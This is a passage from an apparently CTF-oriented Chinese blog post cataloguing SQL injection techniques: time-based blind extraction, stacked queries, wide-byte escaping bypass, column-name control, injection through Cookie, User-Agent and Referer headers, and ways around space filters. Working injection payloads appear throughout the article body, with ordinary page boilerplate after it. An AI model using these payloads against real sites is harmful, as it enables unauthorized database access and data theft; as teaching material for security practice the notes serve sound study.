+<li><p><strong>逐字符猜解数据库名</strong>：示例（猜第一个字符）：<code>?id=1&#39; and if(ascii(substr(database(),1,1))=115,sleep(5),1) --+</code> 若延迟5秒，则说明数据库名称第1个字符为s。</p>
+</li>
+<li><p><strong>猜解表名与字段</strong>：猜解表名，例如 <code>?id=1&#39; and if(substr((select table_name from information_schema.tables where table_schema=database() limit 3,1),1,1)=&#39;u&#39;,sleep(5),1) --+</code> 即为猜解出第4个表名。</p>
+</li>
+<li><p><strong>猜解 <code>username/password</code> 字段</strong>：通过 <code>information_schema.columns</code> 系统表，与布尔盲注的方式相同。</p>
+</li>
+</ul>
+<hr>
+<h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p><strong>概念</strong>：堆叠注入，也称堆查询注入，顾名思义就是多条语句同时执行。在SQL中，分号 <code>;</code> 用来表示一条SQL语句的结束。</p>
+<p><strong>原理</strong>：很简单，<code>mysql_multi_query()</code> 支持多条SQL语句同时执行。</p>
+<p><strong>举例</strong>：比如现在在输入框中输入 <code>1&#39; or 1 = 1#</code>，发现字段被爆破出来了，说明存在SQL注入，尝试堆叠注入。</p>
+<ul>
+<li><strong>查询数据库名</strong>：<code>1&#39;;show database();#</code></li>
+<li><strong>查询表格名</strong>：<code>1&#39;;show tables;#</code></li>
+<li><strong>查询表的结构（获取字段）</strong>：<figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pf"><span class="hljs-number">1</span>&#x27;; show columns <span class="hljs-keyword">from</span> <span class="hljs-built_in">table</span>Name;<span class="hljs-comment">#</span><br><span class="hljs-number">1</span>&#x27;;desc <span class="hljs-built_in">table</span>Name;<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
+<blockquote>
+<p><strong>注意</strong>：如果 <code>tableName</code> 是纯数字，则需要用反单引号（<code>`</code>）将其括起来。</p>
+</blockquote>
+</li>
+</ul>
+<hr>
+<h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p><strong>二次注入概念</strong>：二次注入是指已存储（数据库、文件）的用户输入被读取后再次进入到SQL查询语句中导致的注入。二次注入是SQL注入的一种，但是比普通SQL注入利用更加困难，利用门槛更高。普通注入数据直接进入到SQL查询中，而二次注入则是输入数据经处理后存储，取出后，再次进入到SQL查询。</p>
+<hr>
+<h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p>宽字节注入的核心是利用多字节字符集的编码特性，将 <code>addslashes()</code> 插入的转义反斜杠”吃掉”，使单引号重新生效。</p>
+<p><strong>原理</strong>：其核心在于 <code>addslashes()</code> 函数在用户输入转义时，会在单引号前加斜杠（<code>\&#39;</code>），但如果我们使用宽字节时，斜杠会和之前的宽字节共同被识别为一个高位字符，从而让未被转义的单引号被识别，闭合SQL语句。</p>
+<p><strong>基础payload</strong>：</p>
+<figure class="highlight freedesktop"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs freedesktop"><span class="hljs-attr">id</span><span class="hljs-operator">=</span><span class="hljs-variable">%d</span>f&#x27; or 1<span class="hljs-operator">=</span>1--+<br><span class="hljs-attr">id</span><span class="hljs-operator">=</span><span class="hljs-variable">%d</span>f&#x27; and 1<span class="hljs-operator">=</span>2--+<br></code></pre></td></tr></table></figure>
+
+<p>其他步骤如联合注入等与之前的一样，只需注意id的变化（符合宽字节形式绕过）即可。</p>
+<hr>
+<h3 id="列名控制注入"><a href="#列名控制注入" class="headerlink" title="列名控制注入"></a>列名控制注入</h3><p><strong>本质</strong>：通过控制 <code>select</code> 后的列名&#x2F;投影部分，绕过过滤规则，将原本无法直接访问的 <code>flag</code> 列暴露在查询结果中。</p>
+<p>这类其核心的SQL逻辑语句为 <code>$sql = &quot;select &quot; . $_POST[&#39;query&#39;] . &quot;||flag from Flag&quot;;</code></p>
+<p><strong>基础payload</strong>：<code>*,1</code></p>
+<p>提交 <code>*,1</code> 后，拼接后的SQL语句变为：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span>,<span class="hljs-number">1</span><span class="hljs-operator">||</span>flag <span class="hljs-keyword">from</span> Flag<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p><strong>注</strong>：</p>
+<ul>
+<li><code>*</code>：查询表中所有列。</li>
+<li><code>1</code>：作为常量列，和 <code>||flag</code> 拼接成合法的列表达式。</li>
+<li>MySQL会把 <code>1||flag</code> 当成普通列处理，直接在查询结果中返回 <code>flag</code> 的值。</li>
+</ul>
+</blockquote>
+<hr>
+<h3 id="Cookie注入点"><a href="#Cookie注入点" class="headerlink" title="Cookie注入点"></a>Cookie注入点</h3><p><strong>定义</strong>：普通的SQL注入是把恶意代码放在URL里（<code>?id=1&#39;</code>），而Cookie注入是把恶意代码放在Cookie里。</p>
+<p>程序员只防护了URL参数，忘记了防护Cookie，并且Cookie也会被后端接收并拼接到SQL语句中，这就造成了该漏洞。</p>
+<p><strong>注入过程</strong>：</p>
+<p>首先查看Cookie：</p>
+<ol>
+<li>按 F12 打开开发者工具。</li>
+<li>点击 Application（应用程序）标签（储存中）。</li>
+<li>左边找到 Cookies，点击当前网址。</li>
+<li>就能看到所有Cookie。<br>（当然也可以直接BP抓包，然后查看）</li>
+</ol>
+<p>然后修改Cookie：<br>主要通过HackBar来进行Cookie修改（BP也可以），主要通过修改Cookie值来达到攻击的效果，攻击方法可以使用报错，也可以使用联合查询，具体攻击方式依题判断。</p>
+<blockquote>
+<p><strong>注</strong>：</p>
+<ul>
+<li><strong>LoadURL</strong>：下载当前网址到HackBar上，这个可以省去复制的麻烦。</li>
+<li><strong>Cookie</strong>：Cookie值的修改，也是一个注入点，就和输入框一样，可以在这里进行报错或者联合查询的注入（注：前面必须加上 <code>id=</code>）。</li>
+<li><strong>Execute</strong>：进行攻击尝试。</li>
+</ul>
+</blockquote>
+<hr>
+<h3 id="UA注入点"><a href="#UA注入点" class="headerlink" title="UA注入点"></a>UA注入点</h3><p><strong>定义</strong>：UA（User-Agent），即用户代理，是浏览器访问网站时发送的”自我介绍”，告诉服务器”我是用什么浏览器访问的”。</p>
+<p>UA注入点存在的原因和Cookie注入点一样，即UA可以直接拼接到SQL语句中，且不做任何处理。</p>
+<p>所以，我们可以通过修改UA的值，来实现攻击的目的。</p>
+<p><strong>注入过程</strong>：<br>和Cookie注入点一样，打开HackBar或者使用BP来修改UA的值，并结合报错（主要）、联合查询等方式来进行攻击。</p>
+<blockquote>
+<p><strong>注</strong>：无论是Cookie还是UA、Referer，先判断类型，如果是数字型的话就不用注释，如果是字符型则需要注释。</p>
+</blockquote>
+<hr>
+<h3 id="Referer注入点"><a href="#Referer注入点" class="headerlink" title="Referer注入点"></a>Referer注入点</h3><p><strong>定义</strong>：Referer 是 HTTP 请求头中的一个字段，告诉服务器”我是从哪个页面跳转过来的”。</p>
+<p>产生Referer注入的原因也跟前两者一样，通过直接把Referer拼到SQL语句中，从而达到攻击的目的。</p>
+<p>攻击方式与前两者相同，在HackBar进行攻击。</p>
+<hr>
+<h3 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h3><p>当目标网站或靶场环境中过滤了空格字符后，我们可以使用以下几种方式来绕过限制：</p>
+<ol>
+<li>使用 <code>+</code> 号替代空格：例如，<code>union+select+1,2,3</code>。</li>
+<li>URL编码替代：<code>%20</code>（空格）、<code>%09</code>（水平制表符HT）、<code>%0A</code>（换行符LF）、<code>%0C</code>（换页符FF）、<code>%0D</code>（回车CR）、<code>%0B</code>（垂直制表符VT）、<code>%A0</code>（不间断空格NBS）。</li>
+<li>使用SQL注释符 <code>/**/</code> 替代空格，如：<code>union/**/select</code>。</li>
+<li>括号 <code>()</code> 替代空格：<code>select(database())</code>。</li>
+<li>使用报错注入技巧绕过限制。</li>
+</ol>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/CTF/" class="category-chain-item">CTF</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>CTF - sql注入</div>
+      <div>https://chiya-66.github.io/2026/07/10/ctfwp-sql注入/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>chiya-66</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年7月10日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2026/07/11/http%E4%B8%8Ehttps%E7%9B%B8%E5%85%B3/" title="http与https相关">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">http与https相关</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    function isExpandAllEnabled() {
+      return CONFIG.toc && CONFIG.toc.expand_all === true;
+    }
+    function expandAllToc() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .tocbot-is-collapsed').removeClass('tocbot-is-collapsed');
+    }
+    function updateTocToggle($li, $childList) {
+      var $toggle = $li.children('.toc-toggle');
+      if ($toggle.length === 0) { return; }
+      var collapsed = $childList.hasClass('tocbot-is-collapsed');
+      $toggle
+        .toggleClass('toc-toggle-collapsed', collapsed)
+        .toggleClass('toc-toggle-expanded', !collapsed);
+    }
+    function bindTocToggle() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .toc-list-item').each(function() {
+        var $li = jQuery(this);
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) {
+          if ($li.children('.toc-toggle').length === 0) {
+            $li.prepend('<span class="toc-toggle toc-toggle-placeholder" aria-hidden="true">›</span>');
+          }
+          return;
+        }
+
+        if ($li.children('.toc-toggle').length === 0) {
+          $li.prepend('<span class="toc-toggle toc-toggle-expanded" aria-hidden="true">›</span>');
+        }
+        updateTocToggle($li, $childList);
+      });
+      jQuery('#toc-body').off('click.tocToggle').on('click.tocToggle', '.toc-toggle', function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        var $li = jQuery(this).parent('.toc-list-item');
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) { return; }
+        $childList.toggleClass('tocbot-is-collapsed');
+        updateTocToggle($li, $childList);
+      });
+      if (!window.__tocToggleObserver) {
+        window.__tocToggleObserver = new MutationObserver(function(mutations) {
+          mutations.forEach(function(mutation) {
+            if (mutation.type !== 'attributes' || mutation.attributeName !== 'class') { return; }
+            var $list = jQuery(mutation.target);
+            var $li = $list.parent('.toc-list-item');
+            if ($li.length === 0) { return; }
+            updateTocToggle($li, $list);
+          });
+        });
+        jQuery('#toc-body ol').each(function() {
+          window.__tocToggleObserver.observe(this, { attributes: true });
+        });
+      }
+    }
+    var tocConfig = Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc);
+    if (isExpandAllEnabled()) {
+      tocConfig.collapseDepth = 6;
+    }
+    window.tocbot.init(tocConfig);
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+    expandAllToc();
+    bindTocToggle();
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+        expandAllToc();
+        bindTocToggle();
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
